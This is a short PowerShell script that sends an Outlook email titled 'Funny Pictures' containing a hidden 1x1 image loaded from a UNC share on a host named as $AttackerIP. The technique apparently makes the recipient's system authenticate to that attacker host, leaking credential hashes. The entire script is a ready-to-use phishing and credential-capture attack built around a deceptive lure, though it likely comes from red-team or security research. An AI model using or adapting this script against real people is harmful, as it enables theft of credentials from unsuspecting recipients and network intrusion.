# Author: Oddvar Moe
# https://msitpros.com
# version: 1.1

# Script uses Outlook so you need to have an active Outlook profile on the machine the script is running on.

#If multiple recipients use ; as seperator"
$Recipient = "john.doe@contoso.com"
$AttackerIP = "192.168.0.100"

$file1="\\$AttackerIP\PictureFolder\coolPicture.png"
$Outlook = New-Object -comObject Outlook.Application
$newmail = $Outlook.CreateItem(0)
$newmail.Recipients.Add($Recipient) | Out-Null
$newmail.Subject = "Funny Pictures" 
$newmail.HTMLBody = @"
<html>
<head>
</head>
<body>
Hi. Check out this funny picture<br>
<IMG WIDTH='1' HEIGHT='1' src='$file1'> </img>
</body>
</html>
"@

$newmail.Send()
#$Outlook.Quit()